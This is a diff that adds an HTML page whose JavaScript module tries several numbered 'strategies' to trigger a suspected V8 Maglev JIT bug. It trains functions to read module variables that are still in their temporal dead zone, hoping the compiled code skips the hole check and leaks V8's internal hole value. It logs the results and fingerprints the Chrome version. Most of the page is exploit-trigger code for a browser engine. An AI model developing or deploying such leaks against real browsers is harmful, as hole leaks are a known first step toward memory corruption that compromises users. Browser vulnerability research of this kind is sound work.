@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>loading...</title></head>
+<body>
+<pre id="out">v6 init</pre>
+<script type="module">
+const log = (msg) => {
+  document.getElementById('out').textContent += '\n' + msg;
+  document.title = msg;
+};
+log("start");
+
+// ============================================
+// Strategy 6: Every-iteration access with inner try-catch
+// The function accesses moduleV every iteration
+// Interpreter: ThrowReferenceErrorIfHole fires, caught by inner try
+// After Maglev compiles: hole check removed, no throw, value leaks
+// Key: the try-catch is INSIDE the function so Maglev still compiles it
+// ============================================
+
+function leakEveryIter() {
+  let lastVal = "init";
+  for (let i = 0; i < 500000; i++) {
+    try {
+      lastVal = moduleV;
+      // If we get here, hole check was skipped (Maglev compiled!)
+      return {val: lastVal, iter: i, leaked: true};
+    } catch(e) {
+      // Interpreter threw ReferenceError, continue
+    }
+  }
+  return {val: lastVal, iter: 500000, leaked: false};
+}
+
+let s6 = leakEveryIter();
+export let moduleV = 42;
+
+if (s6.leaked) {
+  let h = typeof s6.val === "undefined" && s6.val !== undefined;
+  log("S6_LEAK:" + JSON.stringify({...s6, isHole:h, type:typeof s6.val}));
+} else {
+  log("S6_NOLEAK:" + JSON.stringify(s6));
+}
+
+// ============================================
+// Strategy 7: Separate warm-up function, then TDZ function
+// Warm up a DIFFERENT function to trigger Maglev, then call TDZ function
+// (Test if Maglev compiles all functions in the module eagerly)
+// ============================================
+
+function warmup() {
+  let s = 0;
+  for (let i = 0; i < 500000; i++) s += i;
+  return s;
+}
+
+// Warm up to ensure Maglev is active
+warmup();
+warmup();
+
+function leakDirect() {
+  return moduleU; // Single access, no loop
+}
+
+// Train leakDirect with initialized value first
+export let moduleU = 77;
+// Now moduleU is initialized, train leakDirect
+for (let i = 0; i < 200000; i++) leakDirect();
+
+// Now we can't un-initialize moduleU...
+// But we CAN check if Maglev is compiling by timing
+let t0 = performance.now();
+for (let i = 0; i < 100000; i++) leakDirect();
+let t1 = performance.now();
+log("S7_TIMING:100K_calls=" + (t1-t0).toFixed(1) + "ms");
+
+// ============================================
+// Strategy 8: Blob module with aggressive iteration count
+// Dynamic import of a fresh module where TDZ is guaranteed
+// ============================================
+
+const blobCode = `
+let leaked = null;
+let leakIter = -1;
+
+function access() {
+  return x;
+}
+
+// Every iteration accesses x (which is in TDZ)
+for (let i = 0; i < 1000000; i++) {
+  try {
+    let v = access();
+    // If we get here, Maglev skipped the hole check!
+    if (leaked === null) {
+      leaked = v;
+      leakIter = i;
+    }
+  } catch(e) {
+    // TDZ error, continue
+  }
+}
+
+export let x = 42;
+export { leaked, leakIter };
+`;
+
+try {
+  const blob = new Blob([blobCode], {type:'application/javascript'});
+  const url = URL.createObjectURL(blob);
+  import(url).then(m => {
+    if (m.leaked !== null) {
+      let h = typeof m.leaked === "undefined" && m.leaked !== undefined;
+      log("S8_LEAK:" + JSON.stringify({leaked:String(m.leaked),iter:m.leakIter,isHole:h,type:typeof m.leaked,x:m.x}));
+    } else {
+      log("S8_NOLEAK:1M_iters_all_threw");
+    }
+  }).catch(e => {
+    log("S8_ERR:" + e.message);
+  });
+} catch(e) {
+  log("S8_INIT_ERR:" + e.message);
+}
+
+// ============================================
+// Strategy 9: Test if inline module uses LdaModuleVariable
+// Export a var, read it in a function, check bytecode behavior
+// If V8 uses LdaContextSlot instead of LdaModuleVariable for
+// inline modules, the bug wouldn't apply
+// ============================================
+
+export let testVar = "original";
+function readTestVar() { return testVar; }
+
+// Modify testVar and check if function sees the change
+// (Module variable semantics = live binding)
+testVar = "modified";
+let readResult = readTestVar();
+log("S9_BINDING:" + JSON.stringify({
+  live: readResult === "modified", // true = live binding = module variable
+  val: readResult
+}));
+
+// ============================================
+// Strategy 10: Check V8 version string
+// ============================================
+try {
+  // Some browsers expose V8 version
+  let ua = navigator.userAgent;
+  let match = ua.match(/Chrome\/(\d+)/);
+  log("S10_UA:Chrome=" + (match ? match[1] : "unknown") + " full=" + ua.substring(0, 100));
+} catch(e) {
+  log("S10_ERR:" + e.message);
+}
+
+log("=== sync done, waiting for S8 async ===");
+</script>
+</body>
+</html>
